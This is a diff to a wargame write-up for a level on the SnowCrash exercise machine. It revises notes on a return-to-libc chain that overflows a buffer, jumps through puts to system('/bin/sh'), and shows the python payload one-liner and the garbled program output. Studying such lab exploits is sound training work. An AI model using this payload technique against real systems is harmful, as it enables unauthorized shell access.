@@ -31,7 +31,7 @@ system =  0xb7e6b060
 /bin/sh = 0xb7f8cc58
 
 # Since we can't direclty use system(/bin/sh) we must call an useless function
-	That isn't starting with address 0xb7
+	that isn't starting with address 0xb7 so we don't exit
 
 # The chosen one is puts
 (gdb) info func
@@ -39,7 +39,11 @@ system =  0xb7e6b060
 0x080483f0  puts
 [...]
 
-python -c 'print "\x41"*80+"\xf0\x83\x04\x08"+"\xf0\x83\x04\x08"+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"*2' > /tmp/j
+# This is how we build our ROP chain:
+	GARBAGE ->   PUTS    -> PUTS ARGUMENT ->   SYSTEM    -> SYSTEM ARGUMENT
+     AAAAA     0x080483f0    "/bin/sh"        0xb7e6b060     "/bin/sh"
+
+python -c 'print "\x41"*80+"\xf0\x83\x04\x08"+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"*8' > /tmp/j
 level2@SnowCrash:~$ cat /tmp/j - | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��`��X���X���
 ���t$�t$ �\$���
